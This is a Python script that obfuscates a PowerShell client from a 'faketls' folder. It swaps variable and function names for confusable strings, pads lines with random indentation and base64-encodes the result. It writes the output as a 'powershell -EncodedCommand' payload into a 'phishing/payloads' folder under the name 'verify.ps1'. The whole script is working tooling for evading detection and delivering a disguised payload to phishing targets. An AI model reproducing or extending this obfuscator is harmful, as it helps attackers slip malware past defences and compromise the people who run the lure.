import re
import random
from base64 import b64encode

EXCLUDED_VARS = {
    "$true", "$false", "$null", "$args", "$input", "$env", "$?", "$PSItem", "$Host",
    "$ExecutionContext", "$Error", "$MyInvocation", "$PWD", "$PSVersionTable", "$LASTEXITCODE"
}

client_code = ""
with open("./faketls/client.ps1") as f:
    client_code = f.read()

param_blocks = re.findall(r'(?i)param\s*\((.*?)\)', client_code, re.DOTALL)
param_blocks = [re.sub(r"[\n\t\s]*", "", x) for x in param_blocks]
param_blocks = sum([x.split(",") for x in param_blocks], [])
param_blocks = [x[x.find("$"):] for x in param_blocks]
param_uses = [x.replace("$", "-") for x in param_blocks]

usedvars = []

for i in range(len(param_blocks)):
    var = param_blocks[i]
    newvar = "".join(random.choices(["B", "8"], k=15))
    newvar = "$B"+newvar
    while newvar in usedvars:
        newvar = "".join(random.choices(["B", "8"], k=15))
        newvar = "$B"+newvar
    usedvars.append(newvar)
    client_code = re.sub(rf'(?<![\w`]){re.escape(var)}(?![\w])', newvar, client_code)
    client_code = re.sub(rf'(?<![\w`]){re.escape(param_uses[i])}(?![\w])', "-"+newvar[1:], client_code)

variables = [x for x in sorted([v for v in set(re.findall(r"(\$[a-zA-Z_][a-zA-Z0-9_]*)", client_code)) if v not in EXCLUDED_VARS], key=len, reverse=True) if x not in usedvars]

for var in variables:
    newvar = "".join(random.choices(["B", "8"], k=15))
    newvar = "$B"+newvar
    while newvar in usedvars:
        newvar = "".join(random.choices(["B", "8"], k=15))
        newvar = "$B"+newvar
    usedvars.append(newvar)
    client_code = re.sub(rf'(?<![\w`]){re.escape(var)}(?![\w])', newvar, client_code)

funcnames = re.findall(r'(?i)^\s*function\s+([a-zA-Z_][a-zA-Z0-9_-]*)\b', client_code, re.MULTILINE) 
newfuncnames = []

for funcname in funcnames:
    newfuncname = "".join(random.choices(["l", "I"], k=16))
    while newfuncname in newfuncnames:
        newfuncname = "".join(random.choices(["l", "I"], k=16))
    newfuncnames.append(newfuncname)
    client_code = client_code.replace(funcname, newfuncname)

client_code_split = client_code.splitlines()
for i in range(len(client_code_split)):
    client_code_split[i] = " "*random.randint(1,len(client_code)//300) + client_code_split[i]

client_code = "\n".join(client_code_split)

encoded_code = client_code.encode("utf-16le")
payload = b"powershell -EncodedCommand " + b64encode(encoded_code) + b" 2>$null"

print(len(client_code))

with open('./faketls/client_obfuscated.ps1', 'w') as f:
    f.write(client_code)

with open("./phishing/payloads/verify.ps1", "wb") as f:
    f.write(payload)
